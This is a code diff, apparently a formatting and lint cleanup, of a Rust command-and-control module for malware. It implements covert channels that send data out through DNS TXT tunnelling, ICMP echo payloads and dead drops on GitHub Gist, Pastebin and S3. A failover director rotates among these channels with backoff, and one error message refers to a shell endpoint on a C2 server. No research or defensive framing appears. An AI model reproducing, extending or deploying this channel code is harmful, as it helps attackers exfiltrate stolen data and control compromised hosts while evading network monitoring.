@@ -70,11 +70,11 @@ pub struct C2ChannelConfig {
 
 #[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
 pub enum ChannelKind {
-    Http,           // smoke_signals HTTP/S channel
-    DnsTunnel,      // DNS query encoding
-    IcmpTunnel,     // ICMP echo payload
-    DeadDrop,       // pastebin / S3 / GitHub Gist
-    WebSocket,      // WebSocket persistent
+    Http,       // smoke_signals HTTP/S channel
+    DnsTunnel,  // DNS query encoding
+    IcmpTunnel, // ICMP echo payload
+    DeadDrop,   // pastebin / S3 / GitHub Gist
+    WebSocket,  // WebSocket persistent
 }
 
 impl Default for C2ChannelConfig {
@@ -134,7 +134,7 @@ impl DnsTunnel {
 
     /// Decode a TXT record response back into data.
     fn decode_response(&self, txt_value: &str) -> Result<Vec<u8>, String> {
-        let clean = txt_value.trim().replace('-', "").replace(' ', "");
+        let clean = txt_value.trim().replace(['-', ' '], "");
         hex::decode(&clean).map_err(|e| format!("DNS tunnel decode failed: {}", e))
     }
 
@@ -143,27 +143,32 @@ impl DnsTunnel {
     pub fn send(&self, data: &[u8]) -> Result<Vec<u8>, String> {
         let query = self.encode_query(data);
         #[cfg(target_os = "linux")]
-        { return self.send_via_resolvconf(&query); }
+        {
+            self.send_via_resolvconf(&query)
+        }
         #[cfg(not(target_os = "linux"))]
-        { return self.send_via_dig(&query); }
+        {
+            return self.send_via_dig(&query);
+        }
     }
 
     /// Linux: use /etc/resolv.conf DNS servers directly.
     #[cfg(target_os = "linux")]
     fn send_via_resolvconf(&self, query: &str) -> Result<Vec<u8>, String> {
-        use std::net::UdpSocket;
         use std::net::Ipv4Addr;
+        use std::net::UdpSocket;
 
         let server = parse_nameserver().unwrap_or_else(|| Ipv4Addr::new(8, 8, 8, 8));
-        let sock = UdpSocket::bind("0.0.0.0:0")
-            .map_err(|e| format!("DNS: bind failed: {}", e))?;
-            sock.set_read_timeout(Some(Duration::from_secs(5)))
+        let sock = UdpSocket::bind("0.0.0.0:0").map_err(|e| format!("DNS: bind failed: {}", e))?;
+        sock.set_read_timeout(Some(Duration::from_secs(5)))
             .map_err(|e| format!("DNS: set timeout failed: {}", e))?;
 
         let dns_query = build_txt_query(query);
         let _ = sock.send_to(&dns_query, (server, 53));
         let mut buf = [0u8; 4096];
-        let n = sock.recv_from(&mut buf).map_err(|_| "DNS: no response".to_string())?;
+        let n = sock
+            .recv_from(&mut buf)
+            .map_err(|_| "DNS: no response".to_string())?;
 
         let response = parse_txt_response(&buf[..n.0])?;
         if response.is_empty() {
@@ -233,17 +238,15 @@ impl IcmpTunnel {
     #[cfg(target_os = "linux")]
     fn send_icmp_linux(&mut self, data: &[u8]) -> Result<Vec<u8>, String> {
         use std::net::UdpSocket;
-        let _sock = UdpSocket::bind("0.0.0.0:0")
-            .map_err(|e| format!("ICMP: bind failed: {}", e))?;
+        let _sock =
+            UdpSocket::bind("0.0.0.0:0").map_err(|e| format!("ICMP: bind failed: {}", e))?;
 
         // Use /bin/ping as a safer fallback if raw sockets aren't available
         if !has_cap_net_raw() {
             return self.send_via_ping(data);
         }
 
-        let raw_fd = unsafe {
-            libc::socket(libc::AF_INET, libc::SOCK_RAW, libc::IPPROTO_ICMP)
-        };
+        let raw_fd = unsafe { libc::socket(libc::AF_INET, libc::SOCK_RAW, libc::IPPROTO_ICMP) };
         if raw_fd == -1 {
             return self.send_via_ping(data);
         }
@@ -271,7 +274,9 @@ impl IcmpTunnel {
                 std::mem::size_of::<libc::sockaddr_in>() as u32,
             )
         };
-        unsafe { libc::close(raw_fd); }
+        unsafe {
+            libc::close(raw_fd);
+        }
 
         if rc == -1 {
             return Err("ICMP: sendto failed (need root?)".to_string());
@@ -285,9 +290,12 @@ impl IcmpTunnel {
     fn send_via_ping(&self, data: &[u8]) -> Result<Vec<u8>, String> {
         let hex_data = hex::encode(data);
         let output = std::process::Command::new("ping")
-            .arg("-c").arg("1")
-            .arg("-s").arg(&(hex_data.len() + 8).to_string())
-            .arg("-p").arg(&hex_data)
+            .arg("-c")
+            .arg("1")
+            .arg("-s")
+            .arg((hex_data.len() + 8).to_string())
+            .arg("-p")
+            .arg(&hex_data)
             .arg(&self.target)
             .output()
             .map_err(|e| format!("ICMP: ping failed: {}", e))?;
@@ -328,10 +336,10 @@ impl DeadDrop {
         match self.kind {
             ChannelKind::DeadDrop => {
                 // Generic HTTP POST — try multiple backends
-                let result = self.try_github_gist(data)
+
+                self.try_github_gist(data)
                     .or_else(|_| self.try_pastebin(data))
-                    .or_else(|_| self.try_s3(data));
-                result
+                    .or_else(|_| self.try_s3(data))
             }
             _ => Err("DeadDrop: invalid channel kind".to_string()),
         }
@@ -353,7 +361,8 @@ impl DeadDrop {
             return Err(format!("DeadDrop: HTTP {}", resp.status()));
         }
 
-        let body = resp.bytes()
+        let body = resp
+            .bytes()
             .map_err(|e| format!("DeadDrop: read failed: {}", e))?
             .to_vec();
 
@@ -391,7 +400,9 @@ impl DeadDrop {
 
         let status = resp.status();
         if status.is_success() {
-            let json: serde_json::Value = resp.json().map_err(|e| format!("DeadDrop: Gist parse: {}", e))?;
+            let json: serde_json::Value = resp
+                .json()
+                .map_err(|e| format!("DeadDrop: Gist parse: {}", e))?;
             if let Some(url) = json["html_url"].as_str() {
                 info!("DeadDrop: Gist created at {}", url);
                 return Ok(url.to_string());
@@ -426,7 +437,9 @@ impl DeadDrop {
             .send()
             .map_err(|e| format!("DeadDrop: Pastebin POST: {}", e))?;
 
-        let url = resp.text().map_err(|e| format!("DeadDrop: Pastebin read: {}", e))?;
+        let url = resp
+            .text()
+            .map_err(|e| format!("DeadDrop: Pastebin read: {}", e))?;
         if url.starts_with("https://pastebin.com/") {
             info!("DeadDrop: Pastebin created at {}", url);
             Ok(url)
@@ -445,18 +458,15 @@ impl DeadDrop {
 // ── Failover Director ────────────────────────────────────────────────────────
 
 /// Failover policy: how to choose the next channel when one fails.
-#[derive(Debug, Clone)]
+#[derive(Debug, Clone, Default)]
 pub enum FailoverPolicy {
     /// Try channels in priority order (lower number = higher priority)
+    #[default]
     Priority,
     /// Try all channels in parallel and use first success
     Race,
     /// Try channels sequentially, rotating on failure
     RoundRobin,
-}
-
-impl Default for FailoverPolicy {
-    fn default() -> Self { FailoverPolicy::Priority }
 }
 
 /// Channel result with metadata for failover decisions.
@@ -530,7 +540,10 @@ impl FailoverDirector {
 
         for &idx in &sorted {
             let name = self.channels[idx].name.clone();
-            let now = SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_secs();
+            let now = SystemTime::now()
+                .duration_since(UNIX_EPOCH)
+                .unwrap_or_default()
+                .as_secs();
 
             // Skip if in cooldown
             if let Some(stat) = self.stats.get(&name) {
@@ -551,7 +564,7 @@ impl FailoverDirector {
                     stat.failures += 1;
                     stat.last_error = result.error.clone();
                     // Cooldown: exponential backoff (2^failures seconds, max 1 hour)
-                    let backoff = (60u64 << stat.failures.min(6)) as u64;
+                    let backoff = 60u64 << stat.failures.min(6);
                     stat.cooldown_until = now + backoff.min(3600);
                 }
             }
@@ -580,57 +593,69 @@ impl FailoverDirector {
                 let result = match config.kind {
                     ChannelKind::DnsTunnel => {
                         let tunnel = DnsTunnel::new(&config.endpoint);
-                        tunnel.send(&data_vec).map(|d| ChannelResult {
-                            channel: config.name.clone(),
-                            kind: config.kind.clone(),
-                            success: true,
-                            latency_ms: 0,
-                            data: d,
-                            error: None,
-                        }).unwrap_or_else(|e| ChannelResult {
-                            channel: config.name.clone(),
-                            kind: config.kind.clone(),
-                            success: false,
-                            latency_ms: 0,
-                            data: Vec::new(),
-                            error: Some(e),
-                        })
+                        tunnel
+                            .send(&data_vec)
+                            .map(|d| ChannelResult {
+                                channel: config.name.clone(),
+                                kind: config.kind.clone(),
+                                success: true,
+                                latency_ms: 0,
+                                data: d,
+                                error: None,
+                            })
+                            .unwrap_or_else(|e| ChannelResult {
+                                channel: config.name.clone(),
+                                kind: config.kind.clone(),
+                                success: false,
+                                latency_ms: 0,
+                                data: Vec::new(),
+                                error: Some(e),
+                            })
                     }
                     ChannelKind::IcmpTunnel => {
                         let mut tunnel = IcmpTunnel::new(&config.endpoint);
-                        tunnel.send(&data_vec).map(|d| ChannelResult {
-                            channel: config.name.clone(),
-                            kind: config.kind.clone(),
-                            success: true,
-                            latency_ms: 0,
-                            data: d,
-                            error: None,
-                        }).unwrap_or_else(|e| ChannelResult {
-                            channel: config.name.clone(),
-                            kind: config.kind.clone(),
-                            success: false,
-                            latency_ms: 0,
-                            data: Vec::new(),
-                            error: Some(e),
-                        })
+                        tunnel
+                            .send(&data_vec)
+                            .map(|d| ChannelResult {
+                                channel: config.name.clone(),
+                                kind: config.kind.clone(),
+                                success: true,
+                                latency_ms: 0,
+                                data: d,
+                                error: None,
+                            })
+                            .unwrap_or_else(|e| ChannelResult {
+                                channel: config.name.clone(),
+                                kind: config.kind.clone(),
+                                success: false,
+                                latency_ms: 0,
+                                data: Vec::new(),
+                                error: Some(e),
+                            })
                     }
                     ChannelKind::DeadDrop => {
-                        let dd = DeadDrop::new(&config.endpoint, config.kind.clone(), config.extra.get("token").map(|s| s.as_str()).unwrap_or(""));
-                        dd.drop(&data_vec).map(|url| ChannelResult {
-                            channel: config.name.clone(),
-                            kind: config.kind.clone(),
-                            success: true,
-                            latency_ms: 0,
-                            data: url.into_bytes(),
-                            error: None,
-                        }).unwrap_or_else(|e| ChannelResult {
-                            channel: config.name.clone(),
-                            kind: config.kind.clone(),
-                            success: false,
-                            latency_ms: 0,
-                            data: Vec::new(),
-                            error: Some(e),
-                        })
+                        let dd = DeadDrop::new(
+                            &config.endpoint,
+                            config.kind.clone(),
+                            config.extra.get("token").map(|s| s.as_str()).unwrap_or(""),
+                        );
+                        dd.drop(&data_vec)
+                            .map(|url| ChannelResult {
+                                channel: config.name.clone(),
+                                kind: config.kind.clone(),
+                                success: true,
+                                latency_ms: 0,
+                                data: url.into_bytes(),
+                                error: None,
+                            })
+                            .unwrap_or_else(|e| ChannelResult {
+                                channel: config.name.clone(),
+                                kind: config.kind.clone(),
+                                success: false,
+                                latency_ms: 0,
+                                data: Vec::new(),
+                                error: Some(e),
+                            })
                     }
                     _ => ChannelResult {
                         channel: config.name.clone(),
@@ -639,7 +664,7 @@ impl FailoverDirector {
                         latency_ms: 0,
                         data: Vec::new(),
                         error: Some("unsupported channel kind in race".to_string()),
-                    }
+                    },
                 };
                 let _ = tx_clone.send(result);
             }));
@@ -690,7 +715,7 @@ impl FailoverDirector {
                         latency_ms: 0,
                         data: Vec::new(),
                         error: Some(e),
-                    }
+                    },
                 }
             }
             ChannelKind::DnsTunnel => {
@@ -711,7 +736,7 @@ impl FailoverDirector {
                         latency_ms: 0,
                         data: Vec::new(),
                         error: Some(e),
-                    }
+                    },
                 }
             }
             ChannelKind::IcmpTunnel => {
@@ -732,7 +757,7 @@ impl FailoverDirector {
                         latency_ms: 0,
                         data: Vec::new(),
                         error: Some(e),
-                    }
+                    },
                 }
             }
             ChannelKind::DeadDrop => {
@@ -754,7 +779,7 @@ impl FailoverDirector {
                         latency_ms: 0,
                         data: Vec::new(),
                         error: Some(e),
-                    }
+                    },
                 }
             }
             ChannelKind::WebSocket => ChannelResult {
@@ -764,18 +789,32 @@ impl FailoverDirector {
                 latency_ms: 0,
                 data: Vec::new(),
                 error: Some("WebSocket: use shell endpoint via C2 server".to_string()),
-            }
+            },
         };
 
-        let elapsed = SystemTime::now().duration_since(start).unwrap_or_default().as_millis() as u64;
-        ChannelResult { latency_ms: elapsed, ..result }
+        let elapsed = SystemTime::now()
+            .duration_since(start)
+            .unwrap_or_default()
+            .as_millis() as u64;
+        ChannelResult {
+            latency_ms: elapsed,
+            ..result
+        }
     }
 
     /// Channel statistics summary.
     pub fn summary(&self) -> Vec<(&str, u64, u64, u64)> {
-        self.stats.iter().map(|(name, stat)| {
-            (name.as_str(), stat.successes, stat.failures, stat.last_latency_ms)
-        }).collect()
+        self.stats
+            .iter()
+            .map(|(name, stat)| {
+                (
+                    name.as_str(),
+                    stat.successes,
+                    stat.failures,
+                    stat.last_latency_ms,
+                )
+            })
+            .collect()
     }
 
     /// Reset statistics for all channels.
@@ -879,7 +918,12 @@ fn parse_txt_response(pkt: &[u8]) -> Result<String, String> {
         offset += 2;
         let _qclass = u16::from_be_bytes([pkt[offset], pkt[offset + 1]]);
         offset += 2;
-        let _ttl = u32::from_be_bytes([pkt[offset], pkt[offset + 1], pkt[offset + 2], pkt[offset + 3]]);
+        let _ttl = u32::from_be_bytes([
+            pkt[offset],
+            pkt[offset + 1],
+            pkt[offset + 2],
+            pkt[offset + 3],
+        ]);
         offset += 4;
         let rdlength = u16::from_be_bytes([pkt[offset], pkt[offset + 1]]) as usize;
         offset += 2;
@@ -887,7 +931,7 @@ fn parse_txt_response(pkt: &[u8]) -> Result<String, String> {
         if _qtype == 16 && rdlength > 0 {
             // TXT record: first byte is length of text
             let txt_len = pkt[offset] as usize;
-            if txt_len + 1 <= rdlength {
+            if txt_len < rdlength {
                 let txt = &pkt[offset + 1..offset + 1 + txt_len];
                 return Ok(String::from_utf8_lossy(txt).to_string());
             }
@@ -902,7 +946,8 @@ fn parse_txt_response(pkt: &[u8]) -> Result<String, String> {
 #[cfg(target_os = "linux")]
 fn lookup_ipv4(host: &str) -> Result<std::net::Ipv4Addr, String> {
     use std::net::ToSocketAddrs;
-    let addrs = (host, 0).to_socket_addrs()
+    let addrs = (host, 0)
+        .to_socket_addrs()
         .map_err(|e| format!("lookup_ipv4 failed: {}", e))?;
     for addr in addrs {
         if let std::net::IpAddr::V4(ip) = addr.ip() {
